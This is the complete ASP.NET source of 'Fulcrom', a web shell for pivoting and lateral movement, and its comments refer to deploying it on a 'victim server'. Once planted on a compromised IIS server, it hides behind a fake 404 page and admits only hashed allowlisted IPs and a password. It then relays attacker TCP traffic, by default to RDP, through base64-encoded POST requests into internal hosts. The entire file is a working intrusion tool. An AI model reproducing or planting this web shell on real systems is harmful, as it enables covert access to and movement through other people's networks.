<%@ Page Language="C#" Debug="true" ENABLESESSIONSTATE = true  ValidateRequest="false" EnableTheming = "False" StylesheetTheme="" Theme="" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Security.Cryptography.X509Certificates" %>
<%@ Import Namespace="System.Net.Security" %>
// [*]Fulcrom v0.1 (c) 2017 by Paul Mueller
// [*]A Web Shell for pivoting and lateral movement 
// [*]Written by Paul Mueller
// [*]Originally a fork of Tunna by Nikos Vassakis at secforce.com 
// [*](c) 2013 by Nikos Vassakis
// REMOVE THIS BEFORE DEPLOYING ON VICTIM SERVER
<script runat="server">
SHA1 sha1 = SHA1.Create();
public static bool ValidateCertificate(object sender, X509Certificate certificate, 
              X509Chain chain, SslPolicyErrors sslPolicyErrors)
{
    return true; 
}

static string GetSHA1Hash(SHA1 SHA1Hash, string input)
    {
        byte[] data = SHA1Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
        StringBuilder sBuilder = new StringBuilder();
        for (int i = 0; i < data.Length; i++)
        {sBuilder.Append(data[i].ToString("x2"));}
        return sBuilder.ToString();
    }

static bool VerifySHA1Hash(SHA1 SHA1Hash, string input, string hash)
    {
        string hashOfInput = GetSHA1Hash(SHA1Hash, input);
        StringComparer comparer = StringComparer.OrdinalIgnoreCase;
        if (0 == comparer.Compare(hashOfInput, hash))
        {return true;}
        else{return false;}
    }

protected Tuple<string,string> ExtractOptions2(string header)
{
    string desthost = "";
    string clientid = ""; 
    string[] tokens = header.Split('&');
    foreach (string s in tokens)
    {
        if (s.StartsWith("desthost"))
        {
            desthost = s.Split('=')[1];
        }
        if (s.StartsWith("clientid"))
        {
            clientid = s.Split('=')[1];
        }
    }        
    return new Tuple<string,string>(desthost,clientid);
}

protected Tuple<string,string> ExtractOptions(string header)
{
    string ip = "127.0.0.1";
    string port = "3389";
    string[] tokens = header.Split('&');
    foreach (string s in tokens)
    {
        if (s.StartsWith("ip"))
        {
            ip = s.Split('=')[1];
        }
        if (s.StartsWith("port"))
        {
            port = s.Split('=')[1];
        }
    }
    return new Tuple<string,string>(ip,port);
}
    
protected Socket connect2(string clientid)
{
    IPHostEntry ipHostInfo;
    IPEndPoint remoteEP;
    IPAddress ipAddress;
    Socket socket;
    string destip;
    string clientidstr = (string)Session["sock_" + clientid];
    
    
    destip = clientidstr.Split(':')[0];
    int destport = Convert.ToInt32(clientidstr.Split(':')[1]);
    
    try
    {
        ipHostInfo = Dns.GetHostByName(destip);
        ipAddress = ipHostInfo.AddressList[0];
        if (ipAddress==null){ throw new Exception("Wrong IP"); }
        remoteEP = new IPEndPoint(ipAddress,destport);
        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 5000); 
    }
    catch
    {
        HttpContext.Current.Response.Write(destip);
        HttpContext.Current.Response.Write("[Server] Unable to resolve IP");
        throw;
    }
    try
    {
        socket.Connect(remoteEP);
    }
    catch(Exception)
    {
        HttpContext.Current.Response.Write("[Server] Unable to connect to socket");
        throw;
    }
    try
    {    //Socket in non-blocking mode because of the consecutive HTTP requests
        socket.Blocking = false;
    }
    catch(Exception)
    {
        HttpContext.Current.Response.Write("[Server] Unable to set socket to non blocking mode");
        throw;
    }
    return socket;
}
    
protected Socket connect(){    //Create and connect to socket
    Socket socket;
    IPHostEntry ipHostInfo;
    IPAddress ipAddress;    
    IPEndPoint remoteEP;
    string ip;
    int port;
    //HttpContext.Current.Response.Write((Session["ip"]));
    //HttpContext.Current.Response.Write((Session["port"]));
    try{                //Initialise values 
        ip = (string) Session["ip"];
        port = (int) Session["port"];
        }
    catch{
        HttpContext.Current.Response.Write("[Server] Missing Arguments "+(string) Session["ip"]+Session["port"]);
        throw;
        }
    try{
        ipHostInfo = Dns.GetHostByAddress(ip); //Dns.GetHostByName
        ipAddress = ipHostInfo.AddressList[0];
        if (ipAddress==null){ throw new Exception("Wrong IP"); }
        remoteEP = new IPEndPoint(ipAddress, port);

        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 20000); 
        }
    catch{
        HttpContext.Current.Response.Write(Session["ip"]);
        HttpContext.Current.Response.Write("[Server] Unable to resolve IP");
        throw;
        }
        
    try{    //Connect to socket
        socket.Connect(remoteEP);
        }
    catch(Exception){
        HttpContext.Current.Response.Write("[Server] Unable to connect to socket");
        throw;
        }
    try{    //Socket in non-blocking mode because of the consecutive HTTP requests
        socket.Blocking = false;
        }
    catch(Exception){
        HttpContext.Current.Response.Write("[Server] Unable to set socket to non blocking mode");
        throw;
        }
    return socket;
}

protected void Denied(){

    Session["running"] = -1;    
    Socket socket = Session["socket"] as Socket;
    if (socket != null)
    {
        socket.Close();
    }            
    Session.Abandon();
    Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId",""));
    Response.Write("W1NlcnZlcl1BY2Nlc3MgRGVuaWVk");
    return;
    }

protected void Error(){
    HttpContext.Current.Response.StatusCode = 404;
    HttpContext.Current.Response.StatusDescription = "Not Found";
    HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
    HttpContext.Current.Server.ClearError();
    HttpContext.Current.Response.End();
    }

protected void Page_Load(object sender, EventArgs e)
{
HttpContext.Current.Server.ScriptTimeout = 20000;
string[] allowedIps = new string[] {"4b84b15bff6ee5796152495a230e45e3d7e947d9"};
string password = "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8";

string remoteIp;
if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
    remoteIp = Request.UserHostAddress;
} else {
    remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0]; 
}

SHA1 sha1 = SHA1.Create();


bool validIp = false;
foreach (string ip in allowedIps) {
    validIp = (validIp || (GetSHA1Hash(sha1,remoteIp) == ip));
}

if (!validIp) {
    Error();
}

if (Request.HttpMethod.ToString() == "POST")
{    
    string base64str = System.Text.Encoding.Default.GetString(Request.BinaryRead(Request.TotalBytes));
    byte[] b = System.Convert.FromBase64String(base64str.Replace(@"-",@"+").Replace(@"_",@"/"));
    string str = Encoding.UTF8.GetString(b);
    string[] stringSeparators = new string[] {"|||"};
    string header = str.Split(stringSeparators,StringSplitOptions.None)[0];   
    string data = str.Split(stringSeparators,StringSplitOptions.None)[1];
    byte[] postData = System.Convert.FromBase64String(data.Replace("-","+").Replace("_","/"));    
    
	if (header.StartsWith("?head"))
    {                
        if (header.StartsWith("?head&cookie"))
        {
            string[] stringSeparatorsPW = new string[] {"&"};
            string pw = GetSHA1Hash(sha1,header.Split(stringSeparatorsPW,StringSplitOptions.None)[2]);
            if (password == pw)
            {
                Session["running"] = 0;
                return;
            }
            else
            {
                //Session["running"] = 0;
                Error();
                return;
            }
        }
		
		else if (Session["running"] == null)
		{
			Denied();
		}
		
		else if((int)Session["running"] != 0 && (int)Session["running"] != 1)
		{
			Denied();
		}
            
        if (header.StartsWith("?head&close&clientid"))
        {
            System.Diagnostics.Debug.WriteLine(header);
            string clientid = header.Split('=')[1];        
            Socket socket = Session["sock_" + clientid] as Socket;
            if (socket != null)
            {
                socket.Close();
                Session.Remove("sock_" + clientid);
            }                    
            
        }
        else if (header.StartsWith("?head&close"))
        {        
            Denied();
        }
           
        if (header.StartsWith("?head&flushall"))
        {
            foreach (string key in Session.Keys)
            {
                if (key.StartsWith("sock"))
                {
                    Socket socket = Session[key] as Socket;
                    if (socket != null)
                    {
                        socket.Close();
                        Session.Remove(key);
                    }
                }
            }
            Response.Write("W0FMTEtJTExFRF0=");
            return;
        }
                
        if (header.StartsWith("?head&setup"))
        {
            Tuple<string,string> result = ExtractOptions2(header);
            string desthost = result.Item1;
            string clientid = result.Item2;
            Session["sock_" + clientid] = desthost;
                try
                {
                    Session["sock_" + clientid] = connect2(clientid);
                    Response.Write("W09LXQ==");
                    return;
                }
                catch (Exception)
                {
                    Response.Write("W0VSUk9SXQ==");
                    return;
                }
        }
                    
        if (header.StartsWith("?head&data"))
        {                
            string clientid = header.Split(new char[] {'&'})[2].Split(new char[] {'='})[1];
            Socket socket = Session["sock_" + clientid] as Socket;
            if (postData.Length > 0)
			{
                try
                {
                    socket.Send(postData);
                }
                catch (Exception ex)
                {
					HttpContext.Current.Response.Write(ex.ToString());
                }
            }
                        
                
            byte[] receiveBuffer = new byte[4096];
            try
            {
                int bytesRead = socket.Receive(receiveBuffer);
                System.Threading.Thread.Sleep(50);
                if (bytesRead > 0) 
				{
                    byte[] received = new byte[bytesRead];
                    Array.Copy(receiveBuffer, received , bytesRead);
                    Response.Write(System.Convert.ToBase64String(received,0,received.Length).Replace("+","-").Replace("/","_"));
                }
                else 
                {
                   HttpContext.Current.Response.Write("");     
                }
        
            }
                catch(Exception)
                {
                    HttpContext.Current.Response.Write("");
                }
        }    
                        
					     
        if (header.StartsWith("?head&proxy"))
		{
            Tuple<string,string> result = ExtractOptions(header);      
            string ip = result.Item1;
            int port = Convert.ToInt32(result.Item2);                            
            Session["ip"] = ip;
            Session["port"] = port;
                
            if ((int)Session["running"] == 0)
            {        
                try
                {
                    Session["socket"] = connect();
                    Session["running"] = 1;
                    Response.Write("[OK]");        
                    return;
                }
                catch(Exception)
                {
                    return;
                }
            }
            else if ((int)Session["running"] == 1)
            {
                Socket socket = Session["socket"] as Socket;
                if (postData.Length > 0)
				{
                    try
				    {
                        socket.Send(postData);
                    }
                    catch(Exception)
					{
                        HttpContext.Current.Response.Write("[Server] Local socket closed");
                    }
                    
                }
                    //Read Data from socket and write to response
                byte[] receiveBuffer = new byte[4096];
                try
				{
                    int bytesRead = socket.Receive(receiveBuffer);
                    if (bytesRead > 0) 
                    {
                        byte[] received = new byte[bytesRead];
                        Array.Copy(receiveBuffer, received , bytesRead);
                        //Response.BinaryWrite(received);
                        Response.Write(System.Convert.ToBase64String(received,0,received.Length).Replace("+","-").Replace("/","_"));
                    }
                    else 
					{
                        HttpContext.Current.Response.Write("");     
                    }
                }
                catch(Exception)
				{
                    HttpContext.Current.Response.Write("");
                }
            }    
        }
    }
	else
	{
		Error();
	}
}
else
{
	Error();
}
}
</script>
